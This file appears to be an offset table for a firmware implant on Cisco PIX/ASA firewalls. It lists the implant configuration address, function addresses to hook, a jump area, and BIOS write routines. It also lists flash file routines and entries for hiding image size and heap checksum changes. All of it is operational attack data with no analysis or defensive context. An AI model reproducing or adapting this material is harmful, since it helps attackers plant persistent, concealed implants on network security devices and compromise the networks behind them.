; --- SECTION I ---
;
0x4008030c            // pix version
0x1c14000             // address of implant configuration
0x0   0x0895a5f0      // allocb
0x1   0x08959f50      // freeb
0x2   0x08061860      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x08470360      // ip_put
0x4   0x080619c0      // close
0x5   0x090e06e0      // atoip
0x6   0x0911041c      // memset
0x7   0x090f78a0      // memmove
0x8   0x08959dc0      // malloc_call_calloc
0x9   0x090f7320      // free
0xa   0x0910c400      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x0000005c      // metaframe offset in block structure
0xe   0x00000078      // interface semiphore in metaframe
0xf   0x090f89f0      // rand
0x15  0x0805fcc0      // process_create
0x16  0x0805f660      // process_suspend
0x17  0x0805ee90      // process_sleep_for
0x18  0x087a0f30      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x09a4ef00      // cur_t
0x1b  0x04            // channel offset in interface struct
0x1c  0x0c            // PUT offset in channel struct
0x1d  0x24            // offset to dest mac in arp structure
0x1e  0x10            // offset to next hop ip in route structure
0x1f  0x20            // size of route struct
0x20  0x084733f0      // calc_ip_cksum
0x21  0x084743b0      // arp_loopkup
0x22  0x08472870      // set_block_hdr_mac_and_proto
0x23  0x08483e90      // get hardware interface
0x24  0x0871c1c0      // get next hop
0x25  0x0871c460      // get route
0x26  0x0846e5c0      // send_it
0x27  0x08476160      // arp_create
0x28  0x087fb990      // get_hw_iface_2
0x2a  0x3c            // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2e  0x000001ac      // offset from cur_t that contains the current context number
0x2f  0x099732a0      // pointer to channnel list
0x30  0x09665320      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x099801d4      // max number of interface cards
0x35  0x09a4f720      // internal_clock
0x36  0x087f9450      // get_interface_mac
0x37  0x0000014b      // offset to hardware interface number in interface struct
0x38  0x00            // offset to ip in route structure
0x39  0x00            // offset to interface num in route structure
0x3a  0x00000420      // offset to send channel in channel list
0x3b  0x083cb770      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x083cb850      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x083cadb0      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x083cb690      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000018      // offset to next IP fragment pointer in block
0x40  0x09a682c0      // address of context list
0x42  0x0910ec50      // checkheaps checksum location
0x43  0x08461f50      // get booted image's filename
0x44  0x08331f4f      // fix image size hook point
0x45  0x01cd8242      // clean image file size
0x46  0xffffffff      // asa fix image size hook point
0x47  0x2c            // offset to filesize in file info struct
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x08610917      // address of our hook point
HookedCall                0x08614060      // called function being hooked
JmpLocation               0x08ffb43a      // empty area to jump to
InterfaceAddr             0x09665320      // same as 0x30 above
InterfaceLeng             0x000001c0      // length of interface struct
IntSecurityOffset         0x1c            // security level field offset
IntNameOffset             0x00000190      // interface name field offset
IntNumOffset              0x0000014b      // interface number field offset
IntVlanOffset             0x10            // same as 0xc above
IntIPOffset               0x20            // ip address offset in the interface struct
IntNetmaskOffset          0x24            // netmask in the iface struct
FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr          0x09a53624      // addr of crypto structure
ArpTableAddrPtr           0x09655568      // addr of first entry in ARP table
NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len           0x00            // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr             0x09a5f780      // addr of the bios class structure
BiosWriteAddr1            0x0832b020      // addr of the bios write function for one specific bios
BiosWriteAddr2            0x0832d810      // addr of the bios write function for one specific bios
BiosWriteAddr3            0x0832d2a0      // addr of the bios write function for one specific bios
BiosWriteAddr4            0x0832e0f0      // addr of the bios write function for one specific bios
BiosWriteOffset           0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress         0x083cc360      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress      0x08332c90      // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress      0x0831a980      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress     0x08332780      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress     0x0831a660      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress       0x083cba50      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress       0x083cc640      // ifs_get_size; get the size of the provided open file
FlashChmodAddress         0x083cbef0      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress      0x083cc050      // ifs_rename; move a file
FlashGetFileInfoAddress   0x00000000      // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress      0x083cd4c0      // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset   0x0000002c      // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr     0x09107010      // The address of a function that returns the platform string 
ASARestatFlashFlagAddr    0xffffffff      // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x08061650      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
